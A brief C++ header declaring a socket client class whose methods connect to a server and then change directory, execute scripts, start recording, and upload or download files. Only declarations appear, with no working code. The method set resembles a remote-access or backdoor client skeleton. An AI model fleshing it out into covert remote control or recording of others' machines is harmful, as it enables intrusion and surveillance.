#include "Sockets.hpp"

class Client{
private:
    SOCKET client_sock;
    const char* server_ip;
    uint16_t port;
    char buff_send[BUFF_SIZE];
    char buff_recv[BUFF_SIZE];

    void handle_client();
public:
    Client(const char* server_ip, uint16_t port);
    void establish_connection();
    void change_dir(char* path);
    void execute_script(char* tokens);
    void start_recording();
    void upload_file(const char* filename);
    void download_file(const char* filename);
};

